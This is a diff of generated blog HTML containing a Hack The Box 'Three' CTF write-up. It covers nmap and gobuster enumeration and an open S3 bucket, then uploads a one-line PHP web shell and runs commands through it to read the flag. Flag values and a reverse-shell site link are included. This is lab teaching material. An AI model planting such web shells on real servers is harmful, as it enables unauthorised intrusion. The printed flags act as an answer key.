-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;more root.txt
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;more root.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
 &lt;p&gt;root flag &amp;ndash;&amp;gt; b91ccec3305e98240082d4474b848528&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -337,12 +387,12 @@ usefull if they are just starting with penetration-testing.&lt;/p&gt;
 &lt;h2 id=&#34;connect-to-htb&#34;&gt;Connect to htb&lt;/h2&gt;
 &lt;p&gt;To connect to your hack the box account, you need &lt;strong&gt;openvpn&lt;/strong&gt;.
 You can install it easily using the following comand:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo apt install openvpn
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo apt install openvpn
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After that, you have to download the .ovpn file from the
 htb website. Click on &amp;ldquo;connect to htb&amp;rdquo;, then click on &amp;ldquo;Starting Point&amp;rdquo;.
 Select &amp;ldquo;TCP&amp;rdquo; as protocol and just download the file.&lt;/p&gt;
 &lt;p&gt;Now you are ready to connect using the following comand:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo openvpn &amp;lt;filename.ovpn&amp;gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo openvpn &amp;lt;filename.ovpn&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;preparation&#34;&gt;Preparation&lt;/h2&gt;
 &lt;p&gt;After you connected to htb using &lt;strong&gt;openvpn&lt;/strong&gt;, you can
 &lt;strong&gt;spawn the machine&lt;/strong&gt; by clicking on the yellow button.&lt;/p&gt;
@@ -356,19 +406,19 @@ Select &amp;ldquo;TCP&amp;rdquo; as protocol and just download the file.&lt;/p&g
 &lt;p&gt;Now the IP adress of the machine should pop up.
 It is really important to save it in your /etc/hosts file.
 You can do it by adding the following line to the file:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-example&#34; data-lang=&#34;example&#34;&gt;&amp;lt;ip_addr&amp;gt;    three
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-example&#34; data-lang=&#34;example&#34;&gt;&amp;lt;ip_addr&amp;gt;    three
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now you can test if the host is up and running.&lt;/p&gt;
 &lt;p&gt;Just use the &lt;strong&gt;ping&lt;/strong&gt; command:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ping three
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ping three
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
 &lt;p&gt;As it&amp;rsquo;s well known, to begin a penetration test it is always
 important to scan the target. I generally use &lt;strong&gt;nmap&lt;/strong&gt; with a couple
 of flags, as shown below:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo nmap -sC -sV three
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo nmap -sC -sV three
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This basic scan will launch a series of default scripts and
 will provide more information on the versions of the services
 that are running on open ports. Here&amp;rsquo;s the output that I got:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-example&#34; data-lang=&#34;example&#34;&gt;Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 10:14 CEST
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-example&#34; data-lang=&#34;example&#34;&gt;Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 10:14 CEST
 Nmap scan report for three (10.129.101.217)
 Host is up (0.22s latency).
 Not shown: 998 closed tcp ports (reset)
@@ -397,7 +447,7 @@ Always play around with the web-page to discover vulnerabilites.&lt;/p&gt;
 
 &lt;p&gt;As the hint says, let&amp;rsquo;s edit our /etc/hosts file, editing
 the line that we added before:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-example&#34; data-lang=&#34;example&#34;&gt;&amp;lt;ip_addr&amp;gt;    thetoppers.htb
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-example&#34; data-lang=&#34;example&#34;&gt;&amp;lt;ip_addr&amp;gt;    thetoppers.htb
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;gobuster&#34;&gt;Gobuster&lt;/h2&gt;
 &lt;p&gt;Performing a in-depth search of hidden (non-protected) files
 and resources of a website is often a good starting point
@@ -422,11 +472,11 @@ that we have to find before the url.&lt;/p&gt;
 &lt;p&gt;The simplest thing to do here is generating all the permutations of 2-character words.
 (including lowercase letters and numeric characters from 1 to 9).
 We can do that by using a tool called crunch (pre-installed on kali linux):&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;crunch &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; abcdefghijklmnopqrstuvwxyz0123456789 &amp;gt; output.txt
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;crunch &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; abcdefghijklmnopqrstuvwxyz0123456789 &amp;gt; output.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we are ready to use gobuster in vhost mode (it will look
 for subdomains by visiting the generated URLs).&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo gobuster vhost -u http://thetoppers.htb -w /home/matte/output.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;===============================================================
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo gobuster vhost -u http://thetoppers.htb -w /home/matte/output.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)
 ===============================================================
@@ -448,7 +498,7 @@ Found: s3.thetoppers.htb (Status: 502) [Size: 424]
 Let&amp;rsquo;s add it to our /etc/hosts file, editing
 the same line as before.
 Here&amp;rsquo;s how my /etc/hosts file looks after this edit:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-example&#34; data-lang=&#34;example&#34;&gt;127.0.0.1       localhost
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-example&#34; data-lang=&#34;example&#34;&gt;127.0.0.1       localhost
 127.0.1.1       kali
 10.129.101.217  thetoppers.htb s3.thetoppers.htb
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;aws&#34;&gt;AWS&lt;/h2&gt;
@@ -471,7 +521,7 @@ Let&amp;rsquo;s do it to see if this is the case.&lt;/p&gt;
 &lt;p&gt;Use the following command to open an interactive menu
 to setup your credentials (you can type random words. If
 you don&amp;rsquo;t, the connection will not work properly).&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aws configure
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aws configure
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;What we can do now is try to see if we can list the buckets
 that are hosted. We have to specify:&lt;/p&gt;
 &lt;ol&gt;
@@ -479,16 +529,16 @@ that are hosted. We have to specify:&lt;/p&gt;
 &lt;li&gt;The command that we want to use, in this case &lt;strong&gt;ls&lt;/strong&gt;;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;!-- raw HTML omitted --&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aws --endpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;http://s3.thetoppers.htb s3 ls
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aws --endpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;http://s3.thetoppers.htb s3 ls
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here&amp;rsquo;s the output that we get:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;2022-09-15 10:33:39 thetoppers.htb
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;2022-09-15 10:33:39 thetoppers.htb
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;which means that there is an actual bucket hosted there.
 Let&amp;rsquo;s try to list the content of that bucket, using
 this command (in this case we have to specify that we want
 to use the s3 protocol to get the objects inside that bucket):&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aws --endpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aws --endpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here&amp;rsquo;s the output that we get:&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-example&#34; data-lang=&#34;example&#34;&gt;			   PRE images/
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-example&#34; data-lang=&#34;example&#34;&gt;			   PRE images/
 2022-09-15 10:33:39          0 .htaccess
 2022-09-15 10:33:39      11952 index.php
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;php&#34;&gt;PHP&lt;/h2&gt;
@@ -499,13 +549,13 @@ in the bucket, by using the &lt;strong&gt;cp&lt;/strong&gt; command, that takes
 a local file as the input.
 I wrote the most basic shell you can have in php, this
 is the source code:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;]); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Otherwise, you can find many reverse shell on this website:  &lt;a href=&#34;https://www.revshells.com/&#34;&gt;https://www.revshells.com/&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;]); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Otherwise, you can find many reverse shell on this website:  &lt;a href=&#34;https://www.revshells.com/&#34;&gt;https://www.revshells.com/&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;Down below you can see how you can copy a file inside a bucket, you simply use &lt;strong&gt;cp&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aws --endpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aws --endpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can then re-run the list command to see that the shell was
 succesfully uploaded.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;                           PRE images/
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;                           PRE images/
 2022-09-15 10:33:39          0 .htaccess
 2022-09-15 10:33:39      11952 index.php
 2022-09-15 12:24:13         64 shell.php
@@ -514,13 +564,13 @@ succesfully uploaded.&lt;/p&gt;
 can process, we can send remote commands by
 modifying and navigating to this URL:  &lt;a href=&#34;http://thetoppers.htb/reverse.php?cmd&#34;&gt;http://thetoppers.htb/reverse.php?cmd&lt;/a&gt;=&amp;lt;any_command&amp;gt;.
 For example, you can list the files in the bucket like this:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;http://thetoppers.htb/reverse.php?cmd=ls+../
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;http://thetoppers.htb/reverse.php?cmd=ls+../
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;And there&amp;rsquo;s the flag!&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;To actually see the content of the flag.txt file you can send this command:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;http://thetoppers.htb/reverse.php?cmd=cat+../flag.txt
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;http://thetoppers.htb/reverse.php?cmd=cat+../flag.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If the web-browser redirects you to some other web page,
 you can also use tools like &lt;strong&gt;wget&lt;/strong&gt;:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wget http://thetoppers.htb/reverse.php?cmd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;cat+../flag.txt
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wget http://thetoppers.htb/reverse.php?cmd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;cat+../flag.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
 &lt;p&gt;root flag: a980d99281a28d638ac68b9bf9453c2b&lt;/p&gt;
 &lt;/blockquote&gt;
